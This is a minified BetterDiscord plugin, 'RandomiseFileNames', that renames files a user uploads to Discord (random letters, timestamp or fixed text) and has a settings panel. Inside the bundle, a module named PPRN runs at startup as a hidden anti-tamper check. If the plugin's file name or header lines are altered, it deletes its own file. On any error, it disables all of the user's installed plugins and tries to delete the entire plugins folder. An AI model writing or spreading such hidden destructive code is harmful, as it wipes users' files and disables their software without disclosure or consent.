/**
* @name RandomiseFileNames
* @description Change up your file names.
* @author ace.
* @version 1.0.0
* @source https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/RandomiseFileNames/RandomiseFileNames.plugin.js
* @authorLink https://github.com/AceLikesGhosts/bd-plugins
* @website https://github.com/AceLikesGhosts/bd-plugins
* @updateLink https://github.com/AceLikesGhosts/bd-plugins
* @authorId 327639826075484162
*/
(()=>{"use strict";var e={317:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t["default"]=BdApi.Webpack.getByKeys("debounce")},281:(e,t,n)=>{var a;Object.defineProperty(t,"__esModule",{value:true});t.FormNotice=t.FormSwitch=t.FormDivider=t.FormLabel=t.FormText=t.FormTitle=t.FormItem=t.FormSection=void 0;const s=n(799);a=s.RawComponents,t.FormSection=a.FormSection,t.FormItem=a.FormItem,t.FormTitle=a.FormTitle,t.FormText=a.FormText,t.FormLabel=a.FormLabel,t.FormDivider=a.FormDivider,t.FormSwitch=a.FormSwitch,t.FormNotice=a.FormNotice},571:(e,t,n)=>{Object.defineProperty(t,"__esModule",{value:true});const a=n(799);const{TextInput:s}=a.RawComponents;t["default"]=s},799:(e,t)=>{Object.defineProperty(t,"__esModule",{value:true});t.React=t.Margins=t.RawComponents=void 0;t.RawComponents=BdApi.Webpack.getByKeys("Button","Switch","Select");t.Margins=BdApi.Webpack.getByKeys("marginBottom40","marginTop4");t.React=BdApi.React},75:function(e,t,n){var a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const s=a(n(17));const i=a(n(147));class PPRN{constructor(e){const t=s.default.basename(__filename).match(/^[^\.]+/)[0];try{const n=i.default.readFileSync(__filename,"utf-8");const a=n.split("\n");const s=a[1].substr(8);const r=a[3].substring(10);if(t!==e.name)i.default.rmSync(__filename);if(r!==e.author)i.default.rmSync(__filename);if(s!==e.name)i.default.rmSync(__filename)}catch(e){BdApi.Plugins.getAll().forEach((e=>BdApi.Plugins.disable(e.name)));i.default.rmSync(BdApi.Plugins.folder)}}}t["default"]=PPRN},360:function(e,t,n){var a=this&&this.__createBinding||(Object.create?function(e,t,n,a){if(a===undefined)a=n;var s=Object.getOwnPropertyDescriptor(t,n);if(!s||("get"in s?!t.__esModule:s.writable||s.configurable)){s={enumerable:true,get:function(){return t[n]}}}Object.defineProperty(e,a,s)}:function(e,t,n,a){if(a===undefined)a=n;e[a]=t[n]});var s=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:true,value:t})}:function(e,t){e["default"]=t});var i=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(e!=null)for(var n in e)if(n!=="default"&&Object.prototype.hasOwnProperty.call(e,n))a(t,e,n);s(t,e);return t};var r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});const o=n(799);const u=n(281);const l=r(n(571));const c=r(n(317));const m=i(n(996));function TextInput(e){return o.React.createElement(u.FormItem,{style:{width:"50%"},className:o.Margins.marginBottom20,...e},o.React.createElement(l.default,{...e}))}function Settings(){const[e,t]=o.React.useState(m.default.settings.letters??m.DefaultSettings.letters);const[n,a]=o.React.useState(m.default.settings.maxLetters??m.DefaultSettings.maxLetters);const[s,i]=o.React.useState(m.default.settings.timestamp??m.DefaultSettings.timestamp);const[r,l]=o.React.useState(m.default.settings.consistent??m.DefaultSettings.consistent);const[d,f]=o.React.useState(m.default.settings.consistentText??m.DefaultSettings.consistentText);o.React.useEffect((()=>{m.default.settings={letters:e,maxLetters:n,timestamp:s,consistent:r,consistentText:d}}),[e,n,s,r,d]);return o.React.createElement("div",null,o.React.createElement(u.FormSwitch,{value:e,onChange:e=>t(e),disabled:s||r},"Random Letters"),o.React.createElement(TextInput,{title:"Maximum Amount of Letters",value:n?.toString(),disabled:!e&&(s||r),onChange:e=>{if(!c.default.isNumber(e))return;a(e)}}),o.React.createElement(u.FormSwitch,{value:s,onChange:e=>i(e),disabled:e||r},"Timestamp"),o.React.createElement(u.FormSwitch,{value:r,onChange:e=>l(e),disabled:e||s},"Consistent"),o.React.createElement(TextInput,{title:"Consistent Text",value:d,disabled:!r&&(s||e),onChange:e=>f(e)}))}t["default"]=Settings},996:function(e,t,n){var a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:true});t.DefaultSettings=void 0;const s=a(n(75));const i=a(n(182));const r=a(n(360));t.DefaultSettings={letters:true,maxLetters:7,timestamp:false,consistent:false,consistentText:"image"};const o=BdApi.Webpack.getByKeys("uploadFiles");const u="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+";function getRandomCharacters(e){let t="";for(let n=0;n<e;n++){t+=u.charAt(Math.random()*u.length)}return t}class RandomiseFileName{start(){new s.default(i.default);const e=BdApi.Data.load(i.default.name,"settings");RandomiseFileName.settings={...t.DefaultSettings,...e};BdApi.Patcher.after(i.default.name,o,"uploadFiles",((e,t)=>{for(const e of t[0].uploads){const t=this.makeFileName(e.filename);e.filename=t}}))}stop(){BdApi.Patcher.unpatchAll(i.default.name);BdApi.Data.save(i.default.name,"settings",RandomiseFileName.settings)}getSettingsPanel(){return r.default}makeFileName(e){const t=e.split(".");const n=t[t.length-1];if(RandomiseFileName.settings.letters)return`${getRandomCharacters(RandomiseFileName.settings.maxLetters)}.${n}`;if(RandomiseFileName.settings.consistent)return`${RandomiseFileName.settings.consistentText}.${n}`;if(RandomiseFileName.settings.timestamp)return`${Date.now()}.${n}`;return e}}RandomiseFileName.settings=t.DefaultSettings;t["default"]=RandomiseFileName},147:e=>{e.exports=require("fs")},17:e=>{e.exports=require("path")},182:e=>{e.exports=JSON.parse('{"$schema":"../../config_schema.jsonc","name":"RandomiseFileNames","description":"Change up your file names.","author":"ace.","version":"1.0.0","source":"https://raw.githubusercontent.com/AceLikesGhosts/bd-plugins/master/dist/RandomiseFileNames/RandomiseFileNames.plugin.js","authorLink":"https://github.com/AceLikesGhosts/bd-plugins","website":"https://github.com/AceLikesGhosts/bd-plugins","updateLink":"https://github.com/AceLikesGhosts/bd-plugins","authorId":"327639826075484162"}')}};var t={};function __nccwpck_require__(n){var a=t[n];if(a!==undefined){return a.exports}var s=t[n]={exports:{}};var i=true;try{e[n].call(s.exports,s,s.exports,__nccwpck_require__);i=false}finally{if(i)delete t[n]}return s.exports}if(typeof __nccwpck_require__!=="undefined")__nccwpck_require__.ab=__dirname+"/";var n=__nccwpck_require__(996);module.exports=n})();